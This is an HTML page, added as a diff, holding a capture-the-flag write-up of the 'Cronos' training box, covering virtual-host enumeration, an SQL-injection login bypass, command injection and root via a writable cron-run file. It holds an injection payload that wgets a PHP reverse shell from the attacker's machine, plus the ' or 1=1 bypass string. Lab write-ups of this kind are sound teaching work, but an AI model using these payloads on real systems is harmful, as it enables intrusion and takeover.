@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF writeups</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/posts.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Header will be loaded here -->
+    <div id="header-placeholder"></div>
+    <div class="main-content">
+        <div class="container">
+<h4 id="box-details">Box details</h4>
+<table>
+<thead>
+<tr>
+<th><strong>Type</strong></th>
+<th>Linux</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Rating</strong></td>
+<td>4.9</td>
+</tr>
+<tr>
+<td><strong>Solves</strong></td>
+<td>~14.5k</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td><code>ch4p</code></td>
+</tr>
+<tr>
+<td><strong>Original Solver</strong></td>
+<td><code>willi34</code></td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>3/10</td>
+</tr>
+</tbody>
+</table>
+<p>Brute-forcing a virtual host, bypassing a login page with SQL injection, code injection and abusing cron jobs to get to root.</p>
+<h4 id="discovery">Discovery</h4>
+<p>Nmap scan to discover open ports :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/b22d4b210aad0ca84cb681e208d92313f63774b4/uploads/2025-12-30T17-11-42-528Z-gtsymt5xa.jpg" /></p>
+<h4 id="web-server">Web server</h4>
+<p>We're presented with the default Apache page. Brute-forcing files and directories gives us nothing. Adding the IP address in our <code>/etc/hosts</code> file under the domain name <code>cronos.htb</code> (name of the box) redirects us to a different page :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/ecb04776faaa748ae6e2fdfc10e351d597b2bd51/uploads/2025-12-30T17-12-03-134Z-sllii337n.jpg" /></p>
+<p>There are 2 distinct websites under different server names (one is the IP address and the other is <code>cronos.htb</code>) and 2 different directories on the system. The goal of adding the entry into the hosts file is to map the IP address to a domain name (usually the box’s name followed by <code>.htb</code>) to then search for cases like these.</p>
+<p>Now that we guessed a valid domain name, we can start brute-forcing entries such that : <code>&lt;guess&gt;.cronos.htb</code> is also tied to a distinct web server on the box. </p>
+<p>We’ll use a tool called <code>ffuf</code> for this. The idea is simple. Go through all the possible subdomains for a domain and compare the output with the website we have now. If the result is any different, then we can assume there exists another website on the server represented by another directory :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/669cf3716b3897d40ca05740091fb09349bd201d/uploads/2025-12-30T17-12-21-674Z-i0y3fjtv4.jpg" /></p>
+<p>We find two subdomains, <code>www</code> and <code>admin</code>. The first one turns out to be an alias for <code>cronos.htb</code>, while the second one proves to be more fruitful :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/c0155a2420e861013cee9d3c79b206992e7b8cb0/uploads/2025-12-30T17-12-49-382Z-l7itmwiec.jpg" /></p>
+<p>To map a subdomain to an IP address in our hosts file, we can follow this syntax :</p>
+<pre class="codehilite"><code>&lt;IP_ADDRESS&gt;     cronos.htb   admin.cronos.htb
+</code></pre>
+
+<h4 id="initial-vector">Initial vector</h4>
+<p>The login page on <code>admin</code> looks custom made, so let’s try to bypass it. The first thing we can do is try and bypass the login with an SQL injection. For login pages to work, our input needs to be compared to something. This can either be done with hard-coded credentials or with a database. When we press submit, a request to the database is made through the backend to check if our input matches any entries. If rows are returned as a result, we’ll be logged in.</p>
+<p>Potential problems can arise with working with databases. For instances, if user input is not properly escaped and sanitized, we could modify the request to modify its logic. Take the following input for example : 
+<code>username=' or 1=1-- -&amp;password=test</code></p>
+<p>The SQL query (or request) we normally send could look like this :</p>
+<pre class="codehilite"><code class="language-sql">SELECT user, password FROM users WHERE user = 'user_input' AND password = 'user_input';
+</code></pre>
+
+<p>Our input will represent the column names, while <code>users</code> is the table name. If the input we provide is put inside the user and password fields without security checks, we could alter the functioning of this query :</p>
+<pre class="codehilite"><code class="language-sql">SELECT user, password FROM users WHERE user = '' OR 1=1-- - '' AND password = 'test';  
+</code></pre>
+
+<p>We escaped the quote that englobed our input to insert our own <code>or</code> condition. On top of that, we added a double hyphen at the end of our input for the user which acts as the start of a comment line in SQL syntax. This is effectively the same as :</p>
+<pre class="codehilite"><code class="language-sql">SELECT user, password FROM users WHERE user = '' OR 1=1;
+</code></pre>
+
+<p>Since <code>1=1</code> is always true, all rows of the table will be returned as a response. The backend checks for returned rows as proof that our username and password matches the ones in the database, and we are granted permission. That’s exactly what we see in the response of our request in Burpsuite :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/01329b36bd93c3467de5888bb11819b43e714732/uploads/2025-12-30T17-13-38-129Z-yhsfg8eox.jpg" /></p>
+<p>The welcome page after the login looks like this :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/1daa753dd834637981738a1c99f2a8a4e457de59/uploads/2025-12-30T17-13-17-775Z-37gpdkubl.jpg" /></p>
+<p>We can either execute the traceroute or ping command on a host of our choice. It won’t work with a routable IP address since these boxes don’t have access to the internet, but we can test it out using the IP address of the VPN. We are obviously executing a command since the output returned to us is the same as the one in the terminal and we can observe a time delay : 
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/441f1bc6c863ba4bfd7e31d1845ffc6692553eaa/uploads/2025-12-30T17-14-15-796Z-2zrfieyl1.jpg" /></p>
+<p>Same command from the terminal :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/e59f1bf90613e543df32333984741bd620f63292/uploads/2025-12-30T17-16-46-341Z-h5wxcdfe7.jpg" /></p>
+<p>So the system command executed by the backend is most likely :</p>
+<pre class="codehilite"><code>ping/traceroute &lt;OUR_IP&gt;
+</code></pre>
+
+<p>When we press execute, we send a POST request to the server with the following parameters, where <code>command</code> decides what command is executed and <code>host</code> decides the target IP address :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/064002e3638145385eb7ce6ea5410b69951e5a0a/uploads/2025-12-30T17-18-22-935Z-ieo3jw8gp.jpg" /></p>
+<p>We can inject our own commands into either of these commands by seperating them with semi-colons like so :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/41d416947ee5c90d9ba08ed5b68b3dcfb607d40d/uploads/2025-12-30T17-18-06-658Z-gcxb2ij1c.jpg" /></p>
+<p>After a bit of enumeration, we find the <code>noulis</code> user. We are the <code>www-data</code> user, but we still have access to the user’s home directory where the first flag awaits.</p>
+<p>I wasn't able to trigger a reverse shell successfully from the command injection, so instead I opted to upload a PHP reverse shell to the web root (<code>/var/www/admin</code>) of the virtualhost instead. We’ll be able to access and trigger it from <code>http://admin.cronos.htb/rev.php</code>. We can start an HTTP server on our machine and use <code>wget</code> to pull it from the target with our command execution :</p>
+<pre class="codehilite"><code>command=traceroute&amp;host=10.10.14.2;wget%20http://10.10.14.2:8000/rev.php
+</code></pre>
+
+<p>We can confirm this works back on our machine :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/1d7c51a0e0131ddb3b56039f6a51da7c589c04f9/uploads/2025-12-30T17-19-10-343Z-uzjogju09.jpg" /></p>
+<p>Visiting our reverse shell will trigger the PHP code to run server-side, giving us a shell as <code>www-data</code> :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/98ac435fd7922e2588ab74db37ae544421769776/uploads/2025-12-30T17-19-23-644Z-z273iqq8l.jpg" /></p>
+<h4 id="privilege-escalation">Privilege escalation</h4>
+<p>I spent a lot of time trying to take over the user <code>noulis</code> by digging inside Laravel config files, but to no avail. I also found a password for the MySQL database. This revealed the hash for the admin password we bypassed with the SQL injection, but I was unable to crack it. After running <code>linpeas</code>, a privilege escalation script, I noticed there was an odd cronjob running as root every minute :
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/7ecfc3305b8374b9f52e7bf1b851a7306b0f289a/uploads/2025-12-30T17-19-53-366Z-ufxmr80kj.jpg" /></p>
+<p>Cronjobs are the equivalent of scheduled tasks on Windows. In this job, the root user execute the artisan PHP file and redirects the output or any error messages into /dev/null, suppressing them. </p>
+<p>We have write access to this file since we are the www-data user, so we can replace the file with our own malicious one that root will run every minute. We can use the same reverse shell we used to get the initial foothold earlier and copy it into the artisan file. We start a listener and after a minute we get a shell : 
+<img alt="" src="https://raw.githubusercontent.com/free-whiteboard-online/Free-Erasorio-Alternative-for-Collaborative-Design/d6c7131398a473945de7778812a3ea2aae564df0/uploads/2025-12-30T17-20-11-180Z-77kpn5e64.jpg" /></p>
+    <!-- Footer will be loaded here -->
+        </div>
+    </div>
+    <div id="footer-placeholder"></div>
+    <script src="/js/script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>
+</body>
+</html>
